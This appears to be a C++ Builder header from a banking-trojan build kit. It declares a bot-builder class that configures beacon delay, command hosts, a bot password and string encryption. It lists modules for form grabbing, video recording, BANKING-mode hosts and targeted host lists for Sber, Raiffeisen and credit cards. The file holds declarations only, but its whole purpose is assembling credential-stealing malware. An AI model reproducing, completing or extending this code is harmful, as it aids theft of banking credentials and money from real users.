//---------------------------------------------------------------------------
//  Утилиты для создания сборки бота
//  Код расчитан на C++ Builder
//---------------------------------------------------------------------------

#ifndef BuilderUtilsH
#define BuilderUtilsH
//---------------------------------------------------------------------------
#include <windows.h>
#include <Classes.hpp>


namespace Builder
{

	//-------------------------------------------------------------------
	//  PackStringsToDoubleZeroEndLine - функция упаковывает строки в
	//		одну строку. Каждая строка будет отделена нулевым символом.
	//		В конце последней строки будет стоять два нулевых символа
	//		Пустые строки будут проигнорированы.
	//
	//  Lines - Исходный набор строк
	//
	//  CryptLines - Указывает о необходимости шифровать каждую строку
	//				 перед упаковкой.
	//
	//  TrimLines - Разрешает обрезку пробелов с лева и правва строки.
	//
	//
	//  OutBuf - результирующий буфер. Память выделяется функцией MemAlloc
	//
	//  OutBufSize - Размер результирующего буфера
	//
	//  Функция возвращает истину если удалось упаковать хотя-бы одну
	//			строку
	//
	//  Примечание: В исходный набор строк Lines могут быть внесены
	//              изменения. П этому если необходимо сохранить строки
	//				в исходном состоянии передавайте их копию
	//-------------------------------------------------------------------
	bool PackStringsToDoubleZeroEndLine(TStrings *Lines,
										bool CryptLines, bool TrimLines,
										PCHAR &OutBuf, DWORD &OutBufSize);
}




PCHAR Module_BankHosts       = "Хосты режима BANKING";
PCHAR Module_Hunter          = "Hunter";
PCHAR Module_JavaConfig      = "Ссылки JAVA";
PCHAR Module_VideoRecorder   = "Запись видео";
PCHAR Module_FormGraber      = "Форм грабер";
PCHAR Module_AzConfig        = "Настройки AZ";
PCHAR Module_SberHosts       = "Хосты Sber";
PCHAR Module_RafaHosts       = "Хосты Rafa";
PCHAR Module_CCHosts         = "Хосты CC";
PCHAR Module_HistoryAnalyzer = "Анализатор истории навигации";



// Версия сборщика
#define BUILDER_VERSION 1



class TBotBuilder;
class TBotModule;
class TBotParam;
class TBotModuleEdit;
class TBotStringsEncryptor;



enum TBotParamStatus {psOk, psWarning, psError};

typedef void __fastcall (__closure *TBuilderMessage)(TBotBuilder *Sender, const UnicodeString &Message);


//*************************************************************
//  TBotBuilder - Класс, сборщик бота
//*************************************************************
class TBotBuilder : public TComponent
{
private:
	UnicodeString FSourceFileName;
	UnicodeString FResultFileName;
	bool FResultFileNameChanged;
	TCollection* FParams;
	TCollection* FModules;
	TList*       FActiveModules;
	TMemoryStream* FFile;   // Загруженный файл
	TBotParam* FStringsPassword; // Пароль шифрования строк
	TBotParam* FPrefix;     // Префикс бота
	TBotParam* FPassword;   // Пароль бота
	TBotParam* FDelay;      // Период отстука
	TBotParam* FHosts;      // Основные хосты
	TBotStringsEncryptor *FStringsEncryptor; // Объяект шифрования строк бота
	TBuilderMessage FOnMessage;
	friend class TBotModule;
	friend class TBotParam;
	void __fastcall UpdateResultFileName(bool Reset);
	void __fastcall WriteParametr(PCHAR Buf, DWORD BufSize, TBotParam* Param);
	void __fastcall ActivateModules();
	void __fastcall DeactivateModules();
	int  __fastcall GetActiveModulesCount();
	int  __fastcall GetCount();
	TBotParam*   __fastcall GetParam(int Index);
	TBotModule*  __fastcall GetActiveModules(int Index);
	void __fastcall EncryptDllData(PCHAR Buf, DWORD BufSize, PCHAR Passw);
protected:
	void __fastcall virtual ParamValueChanged(TBotParam* Sender);
	void __fastcall Message(const UnicodeString &Message);
	void __fastcall Message(TStrings *Messages);
    void __fastcall InitializeModules();
public:
	__fastcall TBotBuilder(TComponent* AOwner);
	__fastcall ~TBotBuilder();

    TBotModule*     __fastcall AddModule(const char *Name);
	void            __fastcall LoadSourceFile(const UnicodeString &FileName);
	TBotParamStatus __fastcall CheckParams(TStrings* Errors, bool FullBuild);
	bool            __fastcall Build(bool FullBuild);
	TBotParam*      __fastcall ParamByName(const AnsiString &Name);
    void            __fastcall ClearParams();

	void __fastcall SaveToStream(TStream *Stream);
	void __fastcall LoadFromStream(TStream *Stream);
	void __fastcall SaveToFile(const UnicodeString &FileName);
	void __fastcall LoadFromFile(const UnicodeString &FileName);
	void __fastcall SetModuleEdit(const UnicodeString &Name, TBotModuleEdit* Edit);
    TBotModule* __fastcall ModuleByName(const UnicodeString &Name);



	__property UnicodeString SourceFileName = {read=FSourceFileName};
	__property UnicodeString ResultFileName = {read=FResultFileName};
	__property int ActiveModulesCount = {read=GetActiveModulesCount};
	__property int ActiveModules[int Index] = {read=GetActiveModules};

	// Базовые параметры бота
	__property TBotParam* Prefix   = {read = FPrefix};
	__property TBotParam* Password = {read = FPassword};
	__property TBotParam* Delay    = {read = FDelay};
	__property TBotParam* Hosts    = {read = FHosts};
	__property int        Count    = {read = GetCount};
	__property TBotParam* Params[int Index] = {read = GetParam};
	// События
    __property TBuilderMessage OnMessage  = {read=FOnMessage, write=FOnMessage};
};


//*************************************************************
//  TBotModule - Класс настроек отдельного модуля
//*************************************************************
class TBotParam : public TCollectionItem
{
private:
	TBotBuilder* FOwner;
	TBotModule*  FModule;
	AnsiString FName;
	bool  FEnabled;
	bool  FNotNull;   // Обязательный параметр
	bool  FEncrypted; // Параметр должен быть шифрованным
	DWORD FSize;      // Размер буфера параметра
	PCHAR FData;      // Данные
	DWORD FDataSize;  // Размер данных
	UnicodeString FTitle;
	void __fastcall Changed();
	AnsiString __fastcall GetAsAnsiString();
	void __fastcall SetAsAnsiString(const AnsiString &Value);
	UnicodeString __fastcall GetAsUnicodeString();
	void __fastcall SetAsUnicodeString(const UnicodeString &Value);
	UnicodeString __fastcall GetAsStrings();
	void __fastcall SetAsStrings(const UnicodeString &Value);
	DWORD __fastcall GetAsLong();
	void __fastcall SetAsLong(DWORD Value);
    bool __fastcall GetActive();

	friend class TBotBuilder;
	friend class TBotModule;
protected:
	UnicodeString __fastcall GetDisplayName(void);
	void __fastcall virtual DoChanged();
	bool __fastcall virtual Write(PCHAR Buf, DWORD BufSize);
    bool __fastcall virtual WriteEmptyData(PCHAR Buf, DWORD BufSize);
	bool __fastcall DoWrite(PCHAR Buf, DWORD BufSize, PCHAR AData, DWORD ADataSize);
	__property PCHAR Data = {read = FData};
public:
	__fastcall TBotParam(TBotBuilder* AOwner, bool NotNull, bool Encrypted, const char* Name, DWORD Size, const char* Title);
	__fastcall ~TBotParam();

	bool __fastcall IsEmpty();
	void __fastcall Clear();
	void __fastcall SetValue(PCHAR Value, DWORD ValueSize);
    int  __fastcall Position(PCHAR Buf, DWORD BufSize);
	TBotParamStatus __fastcall virtual Status();

	void __fastcall SaveToStream(TStream *Stream);
	void __fastcall LoadFromStream(TStream *Stream);

	void __fastcall SaveToStrings(TStrings *Strings);
	void __fastcall LoadFromStrings(TStrings *Strings);

	__property bool Enabled = {read = FEnabled, write = FEnabled};
	__property bool Active  = {read=GetActive};
	__property TBotModule*  Module = {read=FModule};
	__property DWORD Size = {read=FSize};
	__property bool Encrypted = {read = FEncrypted};
	__property UnicodeString Title = {read = FTitle, write = FTitle};
	__property UnicodeString AsStrings = {read = GetAsStrings, write = SetAsStrings};
	__property DWORD AsLong = {read = GetAsLong, write = SetAsLong};
	__property AnsiString AsAnsiString = {read = GetAsAnsiString, write = SetAsAnsiString};
	__property UnicodeString AsUnicodeString = {read = GetAsUnicodeString, write = SetAsUnicodeString};

};



//*************************************************************
//  TBotPassword - Парметер бота - ключ шифрования
//  Выведен отдеьным классом по причине того, что ключ
//  передаётся шифрованный и перед вставкой его необходимо
//  расшифровать
//*************************************************************
class TBotPassword : public TBotParam
{
private:
	DWORD FRealSize;
protected:
	bool __fastcall Write(PCHAR Buf, DWORD BufSize);
	bool __fastcall WriteEmptyData(PCHAR Buf, DWORD BufSize);
public:
	__fastcall TBotPassword(TBotBuilder* AOwner, bool NotNull, bool Encrypted, const char* Name, DWORD Size, const char* Title);

};


//*************************************************************
//  TBotModule - Класс настроек отдельного модуля
//*************************************************************
class TBotModule : public TCollectionItem
{
private:
	TBotBuilder* FBuilder;
	UnicodeString FName;
	TList *FParams;
	TBotModuleEdit* FEdit;
	bool FActive;
	friend class TBotBuilder;
	friend class TBotParam;
	int __fastcall GetParamsCount();
	TBotParam* __fastcall GetParams(int Index);
	bool __fastcall Activate(PCHAR Buf, DWORD BufSize);
public:
	__fastcall TBotModule(TBotBuilder* AOwner, const char *Name);
	__fastcall ~TBotModule();

	TBotParam* __fastcall AddParam(bool NotNull, bool Encrypted, const char* Name, DWORD Size, const char* Title);

    TBotParam* __fastcall ParamByName(const AnsiString &Name);
	bool __fastcall CanEdit();
    bool __fastcall Edit();

	__property bool Active = {read=FActive};
	__property TBotBuilder* Builder = {read = FBuilder};
	__property UnicodeString Name = {read=FName};
	__property int ParamsCount = {read=GetParamsCount};
	__property TBotParam* Params[int Index] = {read=GetParams};
};



//*************************************************************
//   TBotModuleEdit  - Класс редактор модуля
//*************************************************************
class TBotModuleEdit
{
public:
	bool __fastcall virtual Execute(TBotModule *Module) = 0;
};

//*************************************************************
//   TBotStringsEncryptor  - Класс шифрования строк бота
//*************************************************************
class TBotStringsEncryptor : public TComponent
{
public:
	__fastcall TBotStringsEncryptor(TComponent *Owner);
	bool Encrypt(PCHAR Buf, DWORD BufSize, PCHAR Password);
};



//---------------------------------------------------------------------------
#endif
